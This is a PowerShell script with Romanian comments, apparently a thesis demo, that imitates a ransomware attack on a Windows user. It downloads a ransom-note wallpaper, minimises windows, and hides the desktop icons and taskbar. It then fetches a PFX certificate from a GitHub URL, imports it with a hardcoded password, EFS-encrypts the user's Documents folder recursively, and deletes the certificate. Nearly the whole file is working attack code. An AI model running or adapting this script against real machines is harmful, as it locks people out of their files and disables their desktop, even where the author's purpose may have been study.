# Defineste si apeleaza o functie API de Windows pentru a ajuta la schimbarea wallpaper-ului, precum si cea de ascundere taskbar

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}

public class Taskbar {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
    }
"@


Try{

# Descarca imaginea
$imageUrl = "https://www.smartpcuser.com/wp-content/uploads/2020/07/wholocked-ransomware-wallpaper.png" 
$outputPath = "C:\Users\ionut\Downloads\image.jpg" 
Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath 
Write-Output "Image downloaded successfully to $outputPath"

# Minimizeaza toate aplicatiile care ruleaza
$shell = New-Object -ComObject Shell.Application
$shell.MinimizeAll()

# Seteaza imaginea descarcata ca desktop background
[Wallpaper]::SystemParametersInfo(20, 0, "C:\Users\ionut\Downloads\image.jpg" , 3)

# Ascunde icons de pe desktop
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideIcons -Value 1

# Restart Explorer
Stop-Process -ProcessName explorer -Force
Start-Process explorer

# Inchide noua instanta de Windows Explorer
$wex = New-Object -ComObject wscript.shell;
Sleep 3
$wex.SendKeys('%{F4}')
Sleep 2

# Ascunde taskbar
$taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)

# Define the URL of the file to download
$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"

# Define the path where the file will be saved
$outputPath = "C:\Users\ionut\Downloads\certificate.pfx"

# Download the file
Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath

$certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText
$cert = Import-PfxCertificate -FilePath "C:\Users\ionut\Downloads\certificate.pfx" -CertStoreLocation Cert:\CurrentUser\My -Password $certPassword

# Encrypt the folder using the certificate
$folderPath = "C:\Users\ionut\Documents"
$certThumbprint = $cert.Thumbprint
$encryptedFolderPath = [System.IO.Path]::GetFullPath($folderPath)

$folder = Get-Item $encryptedFolderPath
$folder.Attributes += [System.IO.FileAttributes]::Encrypted

function Encrypt-FolderWithCert {
    param (
        [string]$Path,
        [string]$Thumbprint
    )
    $fileList = Get-ChildItem -Path $Path -Recurse -Force
    foreach ($file in $fileList) {
        $fileFullPath = $file.FullName
        $encCommand = "cmd.exe /c cipher /e /s:$fileFullPath /u:$Thumbprint"
        Invoke-Expression -Command $encCommand
    }
}

Encrypt-FolderWithCert -Path $encryptedFolderPath -Thumbprint $certThumbprint

# Define the path to the file to be deleted
$filePath = "C:\Users\ionut\Downloads\certificate.pfx"

# Delete the file
Remove-Item -Path $filePath
}

Catch {"Scriptul a returnat eroare"}
